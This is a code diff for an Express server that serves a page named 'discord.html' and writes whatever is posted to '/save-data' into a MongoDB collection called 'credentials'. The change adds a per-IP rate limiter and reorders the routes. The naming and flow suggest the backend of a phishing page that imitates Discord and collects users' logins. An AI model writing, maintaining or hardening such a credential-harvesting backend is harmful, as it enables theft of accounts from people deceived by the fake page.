@@ -22,11 +22,23 @@ const credentials = new mongoose.Schema({
 
 const DataModel = mongoose.model("credentials", credentials);
 
-app.get("/", (req, res) => {
-	res.sendFile(path.join(__dirname, "public", "discord.html"));
-});
+const rateLimitStore = {};
 
-app.post("/save-data", async (req, res) => {
+const rateLimiter = (req, res, next) => {
+	const userIP = req.ip;
+	const currentTime = Date.now();
+	const lastRequestTime = rateLimitStore[userIP];
+
+	if (lastRequestTime && currentTime - lastRequestTime < 6000) {
+		return res
+			.status(429)
+			.send("Too many requests. Please wait a minute before trying again.");
+	}
+
+	rateLimitStore[userIP] = currentTime;
+	next();
+};
+app.post("/save-data", rateLimiter, async (req, res) => {
 	try {
 		const data = new DataModel(req.body);
 		await data.save();
@@ -35,6 +47,10 @@ app.post("/save-data", async (req, res) => {
 		console.error("Error saving data to MongoDB:", err);
 		res.status(500).send("Error saving data");
 	}
+});
+
+app.get("/", (req, res) => {
+	res.sendFile(path.join(__dirname, "public", "discord.html"));
 });
 
 app.listen(port, () => {
